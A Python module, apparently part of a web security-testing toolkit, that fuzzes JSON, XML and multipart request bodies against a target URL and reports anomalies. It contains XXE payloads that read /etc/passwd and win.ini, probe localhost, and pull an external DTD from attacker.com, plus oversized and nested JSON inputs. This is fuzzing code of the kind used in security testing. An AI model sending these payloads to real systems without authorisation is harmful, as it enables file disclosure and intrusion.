"""
security/fuzzer.py - 模糊测试引擎

核心能力：
- ParameterFuzzer: 参数模糊测试（超长字符串、特殊字符、类型混淆、边界值）
- FormatFuzzer: 格式模糊测试（JSON/XML/CSV/Multipart格式变异）
- MutationEngine: 变异引擎（15种变异策略，基于种子的智能变异）
- FuzzerOrchestrator: 模糊测试编排器（并发、进度、结果聚合、崩溃检测）
"""
import os
import re
import sys
import json
import time
import uuid
import random
import string
import threading
from typing import Any, Dict, List, Optional, Tuple, Callable
from dataclasses import dataclass, field
from enum import Enum
from collections import defaultdict, Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse


# ================================================================
# 变异引擎
# ================================================================
from .mutation_strategy import *  # noqa: F401,F403
from .mutation_engine import *  # noqa: F401,F403
from .fuzz_result import *  # noqa: F401,F403

class FormatFuzzer:
    """格式模糊测试器

    对JSON、XML、CSV、Multipart等请求体格式进行模糊测试。
    检测解析器漏洞、格式注入、XXE等。
    """

    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.mutation_engine = MutationEngine()
        self.results = []

    def fuzz_json(self, url: str, template: Dict, count: int = 30) -> List[Dict]:
        """模糊测试JSON请求体"""
        results = []
        json_str = json.dumps(template)

        mutations = self.mutation_engine.generate_mutations(json_str, count)

        for mutated in mutations:
            result = self._send_request(url, "application/json", mutated)
            result["format"] = "json"
            results.append(result)
            self.results.append(result)

        # 额外的JSON特定测试
        json_specific = self._json_specific_tests(template)
        for payload in json_specific:
            result = self._send_request(url, "application/json", payload)
            result["format"] = "json_specific"
            results.append(result)
            self.results.append(result)

        return results

    def fuzz_xml(self, url: str, template: str, count: int = 30) -> List[Dict]:
        """模糊测试XML请求体（含XXE检测）"""
        results = []

        mutations = self.mutation_engine.generate_mutations(template, count)
        for mutated in mutations:
            result = self._send_request(url, "application/xml", mutated)
            result["format"] = "xml"
            results.append(result)
            self.results.append(result)

        # XXE特定测试
        xxe_payloads = self._xxe_payloads()
        for payload in xxe_payloads:
            result = self._send_request(url, "application/xml", payload)
            result["format"] = "xxe"
            results.append(result)
            self.results.append(result)

        return results

    def fuzz_multipart(self, url: str, fields: Dict, count: int = 20) -> List[Dict]:
        """模糊测试Multipart表单"""
        results = []
        for i in range(count):
            mutated_fields = {}
            for key, value in fields.items():
                if random.random() < 0.5:
                    mutated = self.mutation_engine.mutate(str(value), count=1)
                    mutated_fields[key] = mutated[0] if mutated else value
                else:
                    mutated_fields[key] = value

            boundary = f"----WebKitFormBoundary{uuid.uuid4().hex[:16]}"
            body = self._build_multipart(boundary, mutated_fields)
            result = self._send_request(
                url, f"multipart/form-data; boundary={boundary}", body
            )
            result["format"] = "multipart"
            results.append(result)
            self.results.append(result)

        return results

    def _json_specific_tests(self, template: Dict) -> List[str]:
        """JSON特定模糊测试"""
        payloads = []
        # 类型混淆
        for key in template:
            # 数字→字符串
            t = template.copy()
            t[key] = str(t[key]) if not isinstance(t[key], str) else 123
            payloads.append(json.dumps(t))
            # 数组→对象
            t2 = template.copy()
            t2[key] = [template[key]]
            payloads.append(json.dumps(t2))
            # null
            t3 = template.copy()
            t3[key] = None
            payloads.append(json.dumps(t3))
            # 深度嵌套
            t4 = template.copy()
            t4[key] = {"a": {"b": {"c": {"d": template[key]}}}}
            payloads.append(json.dumps(t4))
        # 超大JSON
        payloads.append(json.dumps({"data": "A" * 100000}))
        # 循环引用模拟
        payloads.append('{"a": {"$ref": "$"}}')
        return payloads[:20]

    def _xxe_payloads(self) -> List[str]:
        """XXE payload"""
        return [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo>&send;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "test">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        ]

    def _build_multipart(self, boundary: str, fields: Dict) -> str:
        """构建Multipart请求体"""
        body = ""
        for key, value in fields.items():
            body += f"--{boundary}\r\n"
            body += f'Content-Disposition: form-data; name="{key}"\r\n\r\n'
            body += f"{value}\r\n"
        body += f"--{boundary}--\r\n"
        return body

    def _send_request(self, url: str, content_type: str, body: str) -> Dict:
        """发送模糊测试请求"""
        result = {
            "url": url,
            "content_type": content_type,
            "body_length": len(body),
            "status_code": 0,
            "response_time": 0,
            "response_length": 0,
            "is_anomaly": False,
            "anomaly_type": "",
            "error": "",
        }
        try:
            import requests
            headers = {"Content-Type": content_type}
            start = time.time()
            response = requests.post(url, data=body, headers=headers,
                                      timeout=self.timeout, allow_redirects=False)
            result["response_time"] = time.time() - start
            result["status_code"] = response.status_code
            result["response_length"] = len(response.content)

            if response.status_code >= 500:
                result["is_anomaly"] = True
                result["anomaly_type"] = "server_error"
            elif "XML" in content_type and "entity" in response.text.lower():
                result["is_anomaly"] = True
                result["anomaly_type"] = "xxe_possible"
        except Exception as e:
            result["error"] = str(e)
            result["is_anomaly"] = True
            result["anomaly_type"] = "connection_error"
        return result

    def get_stats(self) -> Dict:
        anomalies = [r for r in self.results if r.get("is_anomaly")]
        return {
            "total_requests": len(self.results),
            "anomalies": len(anomalies),
            "by_format": dict(Counter(r.get("format", "unknown") for r in self.results)),
            "by_anomaly_type": dict(Counter(r.get("anomaly_type", "") for r in anomalies)),
        }

class FuzzerOrchestrator:
    """模糊测试编排器

    整合参数模糊测试、格式模糊测试、变异引擎。
    支持并发执行、进度追踪、结果聚合、报告生成。
    """

    def __init__(self, max_workers: int = 5, timeout: int = 10):
        self.max_workers = max_workers
        self.timeout = timeout
        self.parameter_fuzzer = ParameterFuzzer(timeout=timeout)
        self.format_fuzzer = FormatFuzzer(timeout=timeout)
        self.mutation_engine = MutationEngine()
        self.all_results = []
        self._cancelled = False

    def fuzz_target(self, url: str, mode: str = "parameter",
                     count: int = 50, json_template: Dict = None,
                     xml_template: str = None) -> Dict:
        """对目标执行模糊测试"""
        self._cancelled = False
        start_time = time.time()

        if mode == "parameter":
            results = self._fuzz_parameters(url, count)
        elif mode == "json":
            results = self.format_fuzzer.fuzz_json(url, json_template or {}, count)
        elif mode == "xml":
            results = self.format_fuzzer.fuzz_xml(url, xml_template or "<root></root>", count)
        elif mode == "full":
            results = self._fuzz_full(url, count, json_template, xml_template)
        else:
            results = self._fuzz_parameters(url, count)

        self.all_results.extend(results)

        return {
            "target": url,
            "mode": mode,
            "total_requests": len(results),
            "anomalies": sum(1 for r in results if self._is_anomaly(r)),
            "duration": time.time() - start_time,
            "results": [self._result_to_dict(r) for r in results],
        }

    def _fuzz_parameters(self, url: str, count: int) -> List:
        """参数模糊测试"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        all_results = []
        if params:
            for param in params:
                if self._cancelled:
                    break
                original = params[param][0] if params[param] else "1"
                results = self.parameter_fuzzer.fuzz_parameter(
                    url, param, original, count // len(params)
                )
                all_results.extend(results)
        else:
            # 无参数时测试常见参数
            common_params = ["id", "q", "search", "page", "name", "file", "path", "url"]
            for param in common_params[:3]:
                if self._cancelled:
                    break
                test_url = f"{url}{'&' if '?' in url else '?'}{param}=1"
                results = self.parameter_fuzzer.fuzz_parameter(
                    test_url, param, "1", count // 3
                )
                all_results.extend(results)

        return all_results

    def _fuzz_full(self, url: str, count: int,
                     json_template: Dict, xml_template: str) -> List:
        """全面模糊测试（参数+JSON+XML）"""
        all_results = []
        all_results.extend(self._fuzz_parameters(url, count // 3))
        if json_template:
            all_results.extend(self.format_fuzzer.fuzz_json(url, json_template, count // 3))
        if xml_template:
            all_results.extend(self.format_fuzzer.fuzz_xml(url, xml_template, count // 3))
        return all_results

    def _is_anomaly(self, result) -> bool:
        if isinstance(result, FuzzResult):
            return result.is_anomaly
        return result.get("is_anomaly", False)

    def _result_to_dict(self, result) -> Dict:
        if isinstance(result, FuzzResult):
            return result.to_dict()
        return result

    def cancel(self):
        """取消模糊测试"""
        self._cancelled = True

    def generate_report(self) -> str:
        """生成模糊测试报告"""
        anomalies = [r for r in self.all_results if self._is_anomaly(r)]

        lines = ["# 模糊测试报告", ""]
        lines.append(f"**总请求数**: {len(self.all_results)}")
        lines.append(f"**异常数**: {len(anomalies)}")
        lines.append(f"**异常率**: {len(anomalies)/len(self.all_results)*100:.1f}%" if self.all_results else "0%")
        lines.append("")

        if anomalies:
            lines.append("## 异常详情")
            lines.append("")
            for i, a in enumerate(anomalies[:50], 1):
                d = self._result_to_dict(a)
                lines.append(f"### {i}. [{d.get('anomaly_type', 'unknown')}] {d.get('parameter', d.get('format', ''))}")
                lines.append(f"- 状态码: {d.get('status_code', 0)}")
                lines.append(f"- 响应时间: {d.get('response_time', 0):.2f}s")
                lines.append(f"- 描述: {d.get('anomaly_description', '')}")
                if d.get('mutated_value'):
                    lines.append(f"- Payload: `{d['mutated_value'][:100]}`")
                lines.append("")

        return "\n".join(lines)

    def get_stats(self) -> Dict:
        anomalies = [r for r in self.all_results if self._is_anomaly(r)]
        return {
            "total_requests": len(self.all_results),
            "anomalies": len(anomalies),
            "anomaly_rate": len(anomalies) / len(self.all_results) if self.all_results else 0,
            "parameter_fuzzer": self.parameter_fuzzer.get_stats(),
            "format_fuzzer": self.format_fuzzer.get_stats(),
            "mutation_engine": self.mutation_engine.get_stats(),
        }
